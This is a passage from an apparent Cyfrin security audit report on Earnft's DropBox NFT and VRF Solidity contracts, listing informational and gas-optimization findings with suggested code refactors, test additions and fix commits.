+ contract VRFHandler is IVRFHandler, VRFConsumerBaseV2Plus {
```

**Mode:**
Fixed in commit [c66de99](https://github.com/Earnft/dropbox-smart-contracts/commit/c66de99a6776bfb5198bee90d7a9c139ec08fc5f).

**Cyfrin:** Verified.

\clearpage
## Informational


### Resolve discrepancy between expected `randomNumber` in `DropBox::_assignTierAndMint` and `DropBoxFractalProtocol::_determineTier`

**Description:** `DropBox::_assignTierAndMint`  generates `randomNumber` between 0 and 9999 and then calls `DropBoxFractalProtocol::_determineTier` passing this as input:
```solidity
// Generate a random number between 0 and 9999
uint256 randomNumber = boxSeed % 10_000;

// Determine the tier of the box based on the random number
uint128 tierId = _determineTier(randomNumber, mintedTierAmountCache);
```

But `DropBoxFractalProtocol::_determineTier`  has a comment expecting `randomNumber` to be between 0 and 999_999:
```solidity
/// @notice Function to determine the tier of the box based on the random number.
/// @param randomNumber The random number to use to determine the tier. 0 to 999_999
/// @param mintedTierAmountCache Total cached amount minted for each tier.
/// @return determinedTierId The tier id of the box.
function _determineTier(uint256 randomNumber, ...)
```

Resolve this discrepancy; it appears that the comment in the latter is incorrect.

**Mode:**
Fixed in commit [4e48b15](https://github.com/Earnft/dropbox-smart-contracts/commit/4e48b15237e0e9f21fa5666595a05fb645d722c6) & [5a3cbf9](https://github.com/Earnft/dropbox-smart-contracts/commit/5a3cbf9b68d1f426bce08984b06b1c92d7675385).

**Cyfrin:** Verified.


### Avoid floating pragma unless creating libraries

**Description:** Per [SWC-103](https://swcregistry.io/docs/SWC-103/) compiler versions in pragmas should be fixed unless creating libraries. Choose a specific compiler version to use for development, testing and deployment, eg:
```diff
- pragma solidity ^0.8.19;
+ pragma solidity 0.8.19;
```

**Mode:**
Fixed in commit [668011e](https://github.com/Earnft/dropbox-smart-contracts/commit/668011ebd393dd1c224b2236e70fc9d0bf043e77).

**Cyfrin:** Verified.


### Refactor duplicate fee sending code into one private function

**Description:** `DropBox::claimDropBoxes` and `revealDropBoxes`  are two `payable` external functions which both implement duplicate fee sending code; refactor this into 1 private function:
```solidity
  function _sendFee(uint256 amount) private {
    bool sent;
    address feesReceiver = feesReceiverAddress;
    // Use low level call to send fee to the fee receiver address
    assembly {
      sent := call(gas(), feesReceiver, amount, 0, 0, 0, 0)
    }
    if (!sent) revert Unauthorized();
  }
```

Then simply call it from both external functions:
```solidity
_sendFee(msg.value);
```

**Mode:**
Fixed in commit [327c12b](https://github.com/Earnft/dropbox-smart-contracts/commit/327c12b4b9351fb87df9f0b4706e6ac662cb59cc).

**Cyfrin:** Verified.


### Use constant `TIER_IDS_LENGTH` in constructor inputs

**Description:** Use constant `TIER_IDS_LENGTH` in constructor inputs:
```solidity
// DropBox:
  constructor(
    uint256 _subscriptionId,
    address _vrfCoordinator,
    address _feesReceiverAddress,
    string memory __baseTokenURI,
    string memory __contractURI,
    address _earmmERC20Token,
    bytes32 _keyHash,
    address _apiAddress,
    uint24[TIER_IDS_LENGTH] memory _tierTokens,
    uint16[TIER_IDS_LENGTH] memory _tierMaxBoxes,
    string[TIER_IDS_LENGTH] memory _tierNames
  )

// DropBoxFractalProtocol:
  constructor(uint24[TIER_IDS_LENGTH] memory tierTokens,
              uint16[TIER_IDS_LENGTH] memory tierMaxBoxes,
              string[TIER_IDS_LENGTH] memory tierNames) {
```

**Mode:**
Fixed in commit [d8af391](https://github.com/Earnft/dropbox-smart-contracts/commit/d8af391035ca785e2c280de4577f79de2ffda59d).

**Cyfrin:** Verified.


### `VRFHandler` shouldn't inherit from `ConfirmedOwner` since it inherits from `VRFConsumerBaseV2Plus` which already inherits from `ConfirmedOwner`

**Description:** `VRFHandler` shouldn't inherit from `ConfirmedOwner` since it inherits from `VRFConsumerBaseV2Plus` which already [inherits](https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.8/vrf/dev/VRFConsumerBaseV2Plus.sol#L101) from `ConfirmedOwner`:
```diff
- contract VRFHandler is ConfirmedOwner, VRFConsumerBaseV2Plus, IVRFHandler {
+ contract VRFHandler is VRFConsumerBaseV2Plus, IVRFHandler {
```

**Mode:**
Fixed in commit [7fe63a3](https://github.com/Earnft/dropbox-smart-contracts/commit/7fe63a32d61adf53ad722a24928f855b68626618).

**Cyfrin:** Verified.


### Use named imports instead of importing the entire namespace

**Description:** Use named imports as they offer a number of [advantages](https://ethereum.stackexchange.com/a/117173) compared to importing the entire namespace.

File: `DropBox.sol`
```solidity
// DropBoxFractalProtocol
import {DropBoxFractalProtocol} from "./DropBoxFractalProtocol.sol";

// VRF Handler Interface
import {IVRFHandler} from "./IVRFHandler.sol";
import {IVRFHandlerReceiver} from "./IVRFHandlerReceiver.sol";

// LimitBreak implementations of ERC721C and Programmable Royalties
import {OwnableBasic, OwnablePermissions} from "@limitbreak/creator-token-standards/src/access/OwnableBasic.sol";
import {ERC721C, ERC721OpenZeppelin} from "@limitbreak/creator-token-standards/src/erc721c/ERC721C.sol";
import {BasicRoyalties, ERC2981} from "@limitbreak/creator-token-standards/src/programmable-royalties/BasicRoyalties.sol";

// OpenZeppelin
import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
```

File: `VRFHandler.sol`
```solidity
// VRF Handler Interface
import {IVRFHandler} from "./IVRFHandler.sol";
import {IVRFHandlerReceiver} from "./IVRFHandlerReceiver.sol";

// Chainlink
import {VRFConsumerBaseV2Plus} from "@chainlink/contracts/src/v0.8/vrf/dev/VRFConsumerBaseV2Plus.sol";
import {IVRFCoordinatorV2Plus} from "@chainlink/contracts/src/v0.8/vrf/dev/interfaces/IVRFCoordinatorV2Plus.sol";
import {VRFV2PlusClient} from "@chainlink/contracts/src/v0.8/vrf/dev/libraries/VRFV2PlusClient.sol";
```

**Mode:**
Fixed in commit [9afe010](https://github.com/Earnft/dropbox-smart-contracts/commit/9afe0109afb01cd30f00393bf00f817c3a39a205).

**Cyfrin:** Verified.


### Use named `mapping` parameters

**Description:** Solidity 0.8.18 [introduced](https://soliditylang.org/blog/2023/02/01/solidity-0.8.18-release-announcement/) named `mapping` parameters; use this feature in `DropBox` for clearer mappings like this:
```solidity
  /// @notice Mappings
  mapping(uint256 boxId => Box boxData) internal boxIdToBox;
  mapping(bytes32 code => bool usedInd) internal oneTimeCodeUsed; // ensure uniqueness of one-time codes
  mapping(bytes32 codeAddressHash => OneTimeCode codeData) internal oneTimeCode; // ensure integrity of one-time code data
  mapping(bytes32 codeAddressHash => uint256[] randomWords) internal oneTimeCodeRandomWords;
  mapping(uint256 vrfRequestId => bytes32 codeAddressHash) internal activeVrfRequests;
  mapping(uint256 vrfRequestId => bool fulfilledInd) internal fulfilledVrfRequests;
```

**Mode:**
Fixed in commit [8f6a168](https://github.com/Earnft/dropbox-smart-contracts/commit/8f6a168a9ddf17d0b0611c305fa8a0f3069ea56d).

**Cyfrin:** Verified.

\clearpage
## Gas Optimization


### Don't initialize to default values

**Description:** Don't initialize to default values:

File: `src/DropBox.sol`
```solidity
142:    isEarnmClaimAllowed = false;
143:    isRevealAllowed = false;
265:      for (uint32 i = 0; i < boxAmount; i++) {
424:    uint256 amountToClaim = 0;
437:    for (uint256 i = 0; i < _boxIds.length; i++) {
478:    for (uint256 i = 0; i < _boxIds.length; i++) {
537:    for (uint256 i = 0; i < _randomWords.length; i++) {
620:    for (uint32 i = 0; i < boxAmount; i++) {
676:    uint256 totalLiability = 0;
784:    for (uint256 i = 0; i < boxIds.length; i++) {
```

**Mode:**
Fixed in commit [16ecc3b](https://github.com/Earnft/dropbox-smart-contracts/commit/16ecc3ba4ef8463d6b805d8ad95a7fa15c96d0db).

**Cyfrin:** Verified.


### Cache storage variables when same values read multiple times

**Description:** Cache storage variables when same values read multiple times:

File: `src/DropBox.sol`
```solidity
232:    if (remainingBoxesAmount == 0) revert NoMoreBoxesToMint();
235:    if (remainingBoxesAmount < boxAmount) revert NoMoreBoxesToMint();

329:    if (remainingBoxesAmount == 0) revert NoMoreBoxesToMint();
354:    if (remainingBoxesAmount < oneTimeCodeData.boxAmount) revert NoMoreBoxesToMint();

357:    if (oneTimeCodeRandomWords[otpHash].length == 0) revert InvalidVrfState();
360:    uint256[] memory randomWords = oneTimeCodeRandomWords[otpHash];
```

**Mode:**
Fixed in commit [3cfec7f](https://github.com/Earnft/dropbox-smart-contracts/commit/3cfec7fe5d6c912725e8db5284399b7177df58a3).

**Cyfrin:** Verified.


### Remove `amountToClaim > 0` check in `DropBox::claimDropBoxes` as previously reverted if `amountToClaim == 0`

**Description:** Remove `amountToClaim > 0` check in `DropBox::claimDropBoxes` as previously reverted if `amountToClaim == 0`:

```solidity
// [Safety check] In case the amount to claim is 0, revert
if (amountToClaim == 0) revert AmountOfEarnmToClaimIsZero();
// ---------------------------------------------------------------------------------------------

//
//
//
//  Contract Earnm Balance and Safety Checks
// ---------------------------------------------------------------------------------------------
// Get the balance of Earnm ERC20 tokens of the contract
uint256 balance = EARNM.balanceOf(address(this));

// [Safety check] Validate there is more than 0 balance of Earnm ERC20 tokens
// [Safety check] Validate there is enough balance of Earnm ERC20 tokens to claim
// @audit remove `amountToClaim > 0` due to prev check which enforced that
// amountToClaim != 0 and amountToClaim is unsigned so can't be negative
if (!(amountToClaim > 0 && balance > 0 && balance >= amountToClaim)) revert InsufficientEarnmBalance();
```

**Mode:**
Fixed in commit [e6231a7](https://github.com/Earnft/dropbox-smart-contracts/commit/e6231a756a50ac36c9e10076d947dcc16b5696ea).

**Cyfrin:** Verified.


### Remove `< 0` checks for unsigned variables since they can't be negative

**Description:** Remove `< 0` checks for unsigned variables since they can't be negative:

File: `src/DropBox.sol`
```solidity
538:      if (_randomWords[i] <= 0) revert InvalidRandomWord();
```

**Mode:**
Fixed in commit [ccc358a](https://github.com/Earnft/dropbox-smart-contracts/commit/ccc358a88e27ed08c85a37c7770af4dea24f9155).

**Cyfrin:** Verified.


### Initialize `DropBox::boxIdCounter` to 1 avoiding default initialization to 0

**Description:** Initialize `DropBox::boxIdCounter` to 1 avoiding default initialization to 0:

```diff
- uint256 internal boxIdCounter; // Counter for the box ids, starting from 1 (see _assignTierAndMint function)
+ uint256 internal boxIdCounter = 1; // Counter for the box ids
```

And change this line in `_assignTierAndMint`:

```diff
- uint256 newBoxId = ++boxIdCounter;
+ uint256 newBoxId = boxIdCounter++;
```

**Mode:**
Fixed in commit [4e2d90b](https://github.com/Earnft/dropbox-smart-contracts/commit/4e2d90b7f18c3bcc3810754941e460bbe6894189).

**Cyfrin:** Verified.


### Enforce ascending order for boxIds to implement more efficient duplicate prevention in `DropBox::claimDropBoxes`

**Description:** Enforce ascending order for boxIds to implements more efficient duplicate prevention in `DropBox::claimDropBoxes`:
```diff
-      for (uint256 j = i + 1; j < _boxIds.length; j++) {
-        if (_boxIds[i] == _boxIds[j]) revert BadRequest();
-      }
+     if(i > 0 && _boxIds[i-1] >= _boxIds[i]) revert BadRequest();
```

**Mode:**
Fixed in commit [756fc82](https://github.com/Earnft/dropbox-smart-contracts/commit/756fc827eb5265c09e7e1eca8c7a55832e58d1f2).

**Cyfrin:** Verified.


### Prefer `calldata` to `memory` for external function parameters

**Description:** Prefer `calldata` to `memory` for external function parameters:

File: `src/DropBox.sol`:
```solidity
158:  function removeOneTimeCodeToAddress(string memory code, address allowedAddress) external only(apiAddress) {
203:    string memory code,
308:  function revealDropBoxes(string memory code) external payable nonReentrant {
406:  function claimDropBoxes(uint256[] memory _boxIds) external payable nonReentrant {
781:  function getBoxTierAndBlockTsOfIds(uint256[] memory boxIds) external view returns (uint256[3][] memory) {
798:  function getOneTimeCodeData(address sender, string memory code) external view returns (OneTimeCode memory) {
805:  function getOneTimeCodeToAddress(address sender, string memory code) external view returns (address) {
929:  function setContractURI(string memory __contractURI) external onlyOwner {
939:  function setBaseTokenURI(string memory __baseTokenURI) external onlyOwner {
```

**Mode:**
Fixed in commit [9776bc3](https://github.com/Earnft/dropbox-smart-contracts/commit/9776bc3f3be227afb45e22356c9887cd4c428b43) & [b0cc24a](https://github.com/Earnft/dropbox-smart-contracts/commit/b0cc24a8450b21c86c92ee8e0056a89d3f0a80b5).

**Cyfrin:** Verified.


### Prefer assignment to named return variables and remove explicit `return` statements

**Description:** [Prefer](https://x.com/DevDacian/status/1796396988659093968) assignment to named return variables and remove explicit return statements.

This applies to most of the codebase however we provide one example of how `DropBoxFractalProtocol::_calculateAmountToClaim` could be refactored to remove the `tokens` variable and `return` statement by using a named return variable:

```solidity
  /// @return tokens The amount of Earnm tokens to claim.
  function _calculateAmountToClaim(uint256 tier, uint256 daysPassed) internal view returns (uint256 tokens) {
      if (tier == 6) tokens = TIER_6_TOKENS;
      if (tier == 5) tokens = TIER_5_TOKENS;
      if (tier == 4) tokens = TIER_4_TOKENS;
      if (tier == 3) tokens = TIER_3_TOKENS;
      if (tier == 2) tokens = TIER_2_TOKENS;
      if (tier == 1) tokens = TIER_1_TOKENS;

      // The maximum amount of tokens to claim is the total amount of tokens
      // Which is obtained after 4 years
      if (daysPassed > FOUR_YEARS_IN_DAYS) {
          tokens *= (10 ** EARNM_DECIMALS);
      }
      else {
          tokens = (tokens * (10 ** EARNM_DECIMALS)) * daysPassed / FOUR_YEARS_IN_DAYS;
      }
  }
```

**Mode:**
Fixed in commit [88c5f55](https://github.com/Earnft/dropbox-smart-contracts/commit/88c5f55d75d69aa2ba66779e27cddf47bddfac14).

**Cyfrin:** Verified.


### Change `Box` struct to use `uint128` saves 1 storage slot per `Box`

**Description:** The current `Box` struct looks like this:
```solidity
  struct Box {
    uint256 blockTs;
    uint256 tier;
  }
```

This will require 2 storage slots for each `Box`. However neither `blockTs` nor `tier` require `uint256`; both can be changed to `uint128` which will pack each `Box` into 1 storage slot:

```solidity
  struct Box {
    uint128 blockTs;
    uint128 tier;
  }
```

This will halve the number of storage reads/writes when reading/writing boxes from/to storage.

**Mode:**
Fixed in commit [88c5f55](https://github.com/Earnft/dropbox-smart-contracts/commit/88c5f55d75d69aa2ba66779e27cddf47bddfac14#diff-3c794fa0376b06334bb77ee613047755475945d090c0853efd4cd33ddd57d6d4L9-R10).

**Cyfrin:** Verified.


### Use `else if` for sequential `if` statements to prevent subsequent checks when a previous check is `true`

**Description:** Use `else if` for sequential `if` statements to prevent subsequent checks when a previous check is `true`. For example `DropBoxFractalProtocol::_determineTier` has this code:
```solidity
if (tierId == 6) maxBoxesPerTier = TIER_6_MAX_BOXES;
if (tierId == 5) maxBoxesPerTier = TIER_5_MAX_BOXES;
if (tierId == 4) maxBoxesPerTier = TIER_4_MAX_BOXES;
if (tierId == 3) maxBoxesPerTier = TIER_3_MAX_BOXES;
if (tierId == 2) maxBoxesPerTier = TIER_2_MAX_BOXES;
if (tierId == 1) maxBoxesPerTier = TIER_1_MAX_BOXES;
```

Here even if the first condition is true, all the other `if` statements will still be executed even though they can't be true. Refactor to:
```solidity
if (tierId == 6) maxBoxesPerTier = TIER_6_MAX_BOXES;
else if (tierId == 5) maxBoxesPerTier = TIER_5_MAX_BOXES;
else if (tierId == 4) maxBoxesPerTier = TIER_4_MAX_BOXES;
else if (tierId == 3) maxBoxesPerTier = TIER_3_MAX_BOXES;
else if (tierId == 2) maxBoxesPerTier = TIER_2_MAX_BOXES;
else if (tierId == 1) maxBoxesPerTier = TIER_1_MAX_BOXES;
```

The same issue also applies in a second loop in the same function though the ordering of checks is different and to `DropBoxFractalProtocol::_calculateAmountToClaim`.

**Mode:**
Fixed in commit [fc8466e](https://github.com/Earnft/dropbox-smart-contracts/commit/fc8466edb470680ef7b7606ca34cdda444d18f33).

**Cyfrin:** Verified.


### Remove call to `_requireCallerIsContractOwner` from `DropBox::setDefaultRoyalty` and `setTokenRoyalty` since they already have the `onlyOwner` modifier

**Description:** Remove call to `_requireCallerIsContractOwner` from `DropBox::setDefaultRoyalty` and `setTokenRoyalty` since they already have the `onlyOwner` modifier:
```diff
function setDefaultRoyalty(address receiver, uint96 feeNumerator) external onlyOwner {
-  _requireCallerIsContractOwner();
  _setDefaultRoyalty(receiver, feeNumerator);
}

function setTokenRoyalty(uint256 tokenId, address receiver, uint96 feeNumerator) external onlyOwner {
-  _requireCallerIsContractOwner();
  _setTokenRoyalty(tokenId, receiver, feeNumerator);
}
```

**Mode:**
Fixed in commit [2939602](https://github.com/Earnft/dropbox-smart-contracts/commit/2939602b20ff093cb21f37b151aa7f5638e109a2).

**Cyfrin:** Verified.


### Bypass first `for` loop in `DropBoxFractalProtocol::_determineTier` when `randomNumber >= TIER_1_MAX_BOXES`

**Description:** Tier 1 is the lowest tier with the most boxes and this condition inside the first `for` loop ensures the first `for` loop will always fails to allocate a `tierId` when `randomNumber >= TIER_1_MAX_BOXES`:
```solidity
// Check if the randomNumber falls within the current tier's range and hasn't exceeded the mint limit.
if ((randomNumber < maxBoxesPerTier) && hasCapacity) return tierId;
```

Hence there is no point entering the first `for` loop when `randomNumber >= TIER_1_MAX_BOXES`; skip the first `for` loop and go straight to the second one:
```diff
  function _determineTier(
    uint256 randomNumber,
    uint256[TIER_IDS_ARRAY_LEN] memory mintedTierAmountCache
  )
    internal
    view
    returns (uint128 /* tierId, function returns before the end of the execution */ )
  {
-    // Iterate backwards from the highest tier to the lowest.
-    for (uint128 tierId = TIER_IDS_LENGTH; tierId > 0; tierId--) {

+    // impossible for first loop to allocate tierId when randomNumber is
+    // >= lowest tier max boxes, so in that case skip to second loop
+    if(randomNumber < TIER_1_MAX_BOXES) {
+      // Iterate backwards from the highest tier to the lowest.
+      for (uint128 tierId = TIER_IDS_LENGTH; tierId > 0; tierId--) {
```

**Mode:**
Fixed in commit [a3d7641](https://github.com/Earnft/dropbox-smart-contracts/commit/a3d7641b472130cadc8502426ee49dbbc4d947d2).

**Cyfrin:** Verified.


### Remove redundant `tierId` validity check from `DropBox::claimDropBoxes`

**Description:** `DropBox::claimDropBoxes` performs this check before calling `DropBoxFractalProtocol::_calculateVestingPeriodPerBox`:
```solidity
// [Safety check] Validate that the box tier is valid
if (!(box.tier > 0 && box.tier <= TIER_IDS_LENGTH)) revert InvalidTierId();
```

However `DropBoxFractalProtocol::_calculateVestingPeriodPerBox` performs the same check, hence this check is redundant and should be removed from `DropBox::claimDropBoxes`.

**Mode:**
Fixed in commit [7ebd568](https://github.com/Earnft/dropbox-smart-contracts/commit/7ebd5682e5263ce42a0432548e4b7ed5b801b7be).

**Cyfrin:** Verified.


### Remove redundant `balance > 0` check from `DropBox::claimDropBoxes`

**Description:** In `DropBox::claimDropBoxes` there is this check:
```solidity
if (!(balance > 0 && balance >= amountToClaim)) revert InsufficientEarnmBalance();
```

However the `balance > 0` component is redundant since the function already reverted if `amountToClaim == 0`, hence the check can be simplified to:
```solidity
if (!(balance >= amountToClaim)) revert InsufficientEarnmBalance();
```

This can be further simplified by removing the need for the `!` negation operation to:
```solidity
if (balance < amountToClaim) revert InsufficientEarnmBalance();
```

**Mode:**
Fixed in commit [a1e6435](https://github.com/Earnft/dropbox-smart-contracts/commit/a1e6435e922db96194cd74490600e23f8a56e20f).

**Cyfrin:** Verified.


### Simplify checks to fail faster and remove negation operator on final boolean result

**Description:** Many checks in the code use a pattern of:
```solidity
if( !(check_1 && check_2 && check_3) ) revert Error();
```

Often these checks can be simplified with improved efficiency by re-writting to:
* use `||`  instead of `&&` which makes the check fail sooner, avoiding evaluation of subsequent components
* removes the need for the final `!` negation operator

File: `src/DropBox.sol`
```diff
// L218
- if (!(boxAmount > 0 && boxAmount <= MAX_BOX_AMOUNT_PER_REVEAL)) revert InvalidBoxAmount();
+ if(boxAmount == 0 || boxAmount > MAX_BOX_AMOUNT_PER_REVEAL) revert InvalidBoxAmount();

// L347
- if (!(oneTimeCodeData.boxAmount > 0 && oneTimeCodeData.boxAmount <= MAX_BOX_AMOUNT_PER_REVEAL)) {
+ if (oneTimeCodeData.boxAmount == 0 || oneTimeCodeData.boxAmount > MAX_BOX_AMOUNT_PER_REVEAL) {

// L417
- if (!(_boxIds.length > 0)) revert Unauthorized();
+ if (boxIds.length == 0) revert Unauthorized();

// L442
- if (!(ownerOf(_boxIds[i]) == msg.sender)) revert Unauthorized();
+ if (ownerOf(_boxIds[i]) != msg.sender) revert Unauthorized();
```

File: `src/DropBoxFractalProtocol.sol`
```diff
// L170
- if (!(boxTierId > 0 && boxTierId <= tierIdsLength)) revert InvalidTierId();
+ if (boxTierId == 0 || boxTierId > tierIdsLength) revert InvalidTierId();

// L173
- if (!(boxMintedTimestamp <= block.timestamp && boxMintedTimestamp > 0)) revert InvalidBlockTimestamp();
+ if (boxMintedTimestamp > block.timestamp || boxMintedTimestamp == 0) revert InvalidBlockTimestamp();
```

**Mode:**
Fixed in commit [96773b9](https://github.com/Earnft/dropbox-smart-contracts/commit/96773b972fafd3086a18ad03e65c7199695b5577).

**Cyfrin:** Verified.


### Use a simplified and more efficient implementation for `DropBoxFractalProtocol::_determineTier`

**Description:** Use a simplified and more efficient implementation for `DropBoxFractalProtocol::_determineTier` such as:
```solidity
  function _determineTier(
    uint256 randomNumber,
    uint256[TIER_IDS_ARRAY_LEN] memory mintedTierAmountCache
  )
    internal
    view
    returns (uint128 /* tierId, function returns before the end of the execution */ )
  {
    // if the randomNumber is smaller than TIER_1_MAX_BOXES, first attempt
    // tier selection which prioritizes the most valuable tiers for selection where:
    // 1) randomNumber falls within one or more tiers AND
    // 2) the tier(s) have not been exhausted
    if(randomNumber < TIER_1_MAX_BOXES) {
      if(randomNumber < TIER_6_MAX_BOXES && mintedTierAmountCache[6] < TIER_6_MAX_BOXES) return 6;
      if(randomNumber < TIER_5_MAX_BOXES && mintedTierAmountCache[5] < TIER_5_MAX_BOXES) return 5;
      if(randomNumber < TIER_4_MAX_BOXES && mintedTierAmountCache[4] < TIER_4_MAX_BOXES) return 4;
      if(randomNumber < TIER_3_MAX_BOXES && mintedTierAmountCache[3] < TIER_3_MAX_BOXES) return 3;
      if(randomNumber < TIER_2_MAX_BOXES && mintedTierAmountCache[2] < TIER_2_MAX_BOXES) return 2;
      if(randomNumber < TIER_1_MAX_BOXES && mintedTierAmountCache[1] < TIER_1_MAX_BOXES) return 1;
    }

    // if we get here it means that either:
    // 1) randomNumber >= TIER_1_MAX_BOXES OR
    // 2) the tier(s) randomNumber fell into had been exhausted
    //
    // in this case we attempt to allocate based on what is available
    // prioritizing from the least valuable tiers
    if(mintedTierAmountCache[1] < TIER_1_MAX_BOXES) return 1;
    if(mintedTierAmountCache[2] < TIER_2_MAX_BOXES) return 2;
    if(mintedTierAmountCache[3] < TIER_3_MAX_BOXES) return 3;
    if(mintedTierAmountCache[4] < TIER_4_MAX_BOXES) return 4;
    if(mintedTierAmountCache[5] < TIER_5_MAX_BOXES) return 5;
    if(mintedTierAmountCache[6] < TIER_6_MAX_BOXES) return 6;

    // if we get here it means that all tiers have been exhausted
    revert NoMoreBoxesToMint();
  }
```

**Mode:**
Fixed in commit [0e3410b](https://github.com/Earnft/dropbox-smart-contracts/commit/0e3410b6bdf8150e3ed613af2713747cd93084f8).

**Cyfrin:** Verified.


### Only read and write once for storage locations `boxIdCounter` and `mintedTierAmount` in `DropBox::_assignTierAndMint`

**Description:** In `DropBox::_assignTierAndMint`, `boxIdCounter` and `mintedTierAmount` can be cached before the loop, use the cached version during the loop and finally update once at the end:
```solidity
  function _assignTierAndMint(
    uint32 boxAmount,
    uint256[] memory randomNumbers,
    address claimer,
    bytes memory code
  )
    internal
  {
    uint256[] memory boxIdsToEmit = new uint256[](boxAmount);

    // [Gas] Cache mintedTierAmount, update cache during the loop and record
    // which tiers were updated. At the end of the loop write once to storage
    // only for tiers which were updated. Also prevents `_determineTier` from
    // re-reading storage multiple times
    bool[TIER_IDS_ARRAY_LEN] memory tierChangedInd;
    uint256[TIER_IDS_ARRAY_LEN] memory mintedTierAmountCache = mintedTierAmount;

    // [Gas] cache the current boxId, use cache during the loop then write once
    // at the end; this results in only 1 storage read and 1 storage write for `boxIdCounter`
    uint256 boxIdCounterCache = boxIdCounter;

    // For each box to mint
    for (uint32 i; i < boxAmount; i++) {
      // Generate a new box id, starting from 1
      uint256 newBoxId = boxIdCounterCache++;

      // The box seed is directly derived from the random number without any
      // additional values like the box id, the claimer address, or the block timestamp.
      // This is made like this to ensure the tier assignation of the box is purely random
      // and the tier that the box is assigned to, won't change after the randomness is fulfilled.
      // The only way to predict the seed is to know the random number.
      // Random number validation is done in the _fulfillRandomWords function.
      uint256 boxSeed = uint256(keccak256(abi.encode(randomNumbers[i])));

      // Generate a random number between 0 and TOTAL_MAX_BOXES - 1 using the pure random seed
      // Modulo ensures that the random number is within the range of [0, TOTAL_MAX_BOXES) (upper bound exclusive),
      // providing a uniform distribution across the possible range. This ensures that each tier has a
      // probability of being selected proportional to its maximum box count. The randomness is normalized
      // to fit within the predefined total boxes, maintaining the intended probability distribution for each tier.
      //
      // Example with the following setup:
      // _tierMaxBoxes -> [1, 10, 100, 1000, 2000, 6889]
      // _tierNames -> ["Mythical Box", "Legendary Box", "Epic Box", "Rare Box", "Uncommon Box", "Common Box"]
      //
      // The `TOTAL_MAX_BOXES` is the sum of `_tierMaxBoxes`, which is 10_000.
      // The probability distribution is as follows:
      //
      // Mythical Box:   1    / 10_000  chance.
      // Legendary Box:  10   / 10_000  chance.
      // Epic Box:       100  / 10_000  chance.
      // Rare Box:       1000 / 10_000  chance.
      // Uncommon Box:   2000 / 10_000  chance.
      // Common Box:     6889 / 10_000  chance.
      //
      // By using the modulo operation with TOTAL_MAX_BOXES, the random number's probability
      // to land in any given tier is determined by the number of max boxes available for that tier
      uint256 randomNumber = boxSeed % TOTAL_MAX_BOXES;

      // Determine the tier of the box based on the random number
      uint128 tierId = _determineTier(randomNumber, mintedTierAmountCache);

      // Increment the cached amount for this tier and mark this tier as changed
      ++mintedTierAmountCache[tierId];
      tierChangedInd[tierId] = true;

      // [Memory] Add the box id to the boxes ids array
      boxIdsToEmit[i] = newBoxId;

      // Save the box to the boxes mappings
      _saveBox(newBoxId, tierId);

      // Mint the box; explicitly not using `_safeMint` to prevent
      // re-entrancy issues
      _mint(claimer, newBoxId);
    }

    // update storage for boxIdCounter
    boxIdCounter = boxIdCounterCache;

    // update storage for mintedTierAmount only for tiers which were changed
    // hence each tier from mintedTierAmount storage is read only once and only
    // tiers which changed are written to storage only once
    for(uint128 tierId = 1; tierId<TIER_IDS_ARRAY_LEN; tierId++) {
      if(tierChangedInd[tierId]) {
        mintedTierAmount[tierId] = mintedTierAmountCache[tierId];
      }
    }

    // Emit an event indicating the boxes have been minted
    emit BoxesMinted(claimer, boxIdsToEmit, code);
  }
```

The supplied code also has a couple of other useful changes inside the loop:
* `mintedTierAmountCache` and `boxIdsToEmit` are changed before calling `_saveBox` and `_mint` (Effects before Interactions)
* comment added to note that `_mint` is being explicitly used instead of `_safeMint`

We also found that the unit testing around `mintedTierAmount` was lacking in that we could comment out lines of code and all the tests would still pass, so we added more unit tests around this area:

File: `test/mocks/DropBoxMock.sol`
```solidity
// couple of helper functions
  /// @dev [Test purposes] Test get the minted tier amounts
  function mock_getMintedTierAmount(uint128 tierId) public view returns (uint256) {
    return mintedTierAmount[tierId];
  }
  function mock_getMintedTierAmounts() public view returns (uint256[TIER_IDS_ARRAY_LEN] memory) {
    return mintedTierAmount;
  }
```

File: `test/DropBox/behaviors/revealDropBox/revealDropBoxes.t.sol`
```solidity
// firstly over-write the `_validateMinting` function to perform additional verification
  function _validateMinting(
    uint256[TIER_IDS_ARRAY_LEN] memory prevMintedTierAmounts,
    uint32 boxAmount,
    string memory code) internal
  {
    uint256[] memory expectedBoxIds = new uint256[](boxAmount);
    for (uint256 i; i < boxAmount; i++) {
      expectedBoxIds[i] = i + 1;
    }

    vm.expectEmit(address(dropBox));
    emit DropBoxFractalProtocolLib.BoxesMinted(users.stranger, expectedBoxIds, abi.encode(code));
    _fundAndReveal(users.stranger, code, 1 ether);

    (uint256 blockTs, uint256 tier, address owner) = dropBox.getBox(1);
    assertEq(owner, users.stranger);
    assertGt(tier, 0);
    assertLt(tier, 7);

    // iterate over the boxes to get their types and update the
    // previous minted tier amounts
    for (uint256 i; i < expectedBoxIds.length; i++) {
      (,uint128 boxTierId, address owner) = dropBox.getBox(expectedBoxIds[i]);
      assertEq(owner, users.stranger);

      // increment previously minted tierId for this tier
      ++prevMintedTierAmounts[boxTierId];
    }

    // verify DropBox::mintedTierAmount has been correctly changed
    for(uint128 tierId = 1; tierId < TIER_IDS_ARRAY_LEN; tierId++) {
      assertEq(dropBox.mock_getMintedTierAmount(tierId), prevMintedTierAmounts[tierId]);
    }
  }

// next in the tests where _validateMinting is called, simply replace the call with this line
_validateMinting(dropBox.mock_getMintedTierAmounts(), boxAmount, code);
```

**Mode:**
Fixed in commit [5badac3](https://github.com/Earnft/dropbox-smart-contracts/commit/5badac3a5a6de31d0ad84decdefd0e4938e07be3).

**Cyfrin:** Verified.


### Cache result of `_getOneTimeCodeHash` to prevent repeated identical calculation in `DropBox::associateOneTimeCodeToAddress`

**Description:** `DropBox::associateOneTimeCodeToAddress` currently calculates `_getOneTimeCodeHash(code, allowedAddress)` twice:
```solidity
    // [Safety check] Validate that the one-time code is not already associated to an address
    // @audit 1) calculating _getOneTimeCodeHash for first time
    address claimerAddress = oneTimeCode[_getOneTimeCodeHash(code, allowedAddress)].claimer;
    if (claimerAddress != address(0x0)) revert OneTimeCodeAlreadyAssociated(claimerAddress);

    // [Safety check] Validate that the one-time code has not been used
    if (oneTimeCodeUsed[keccak256(bytes(code))]) revert OneTimeCodeAlreadyUsed();

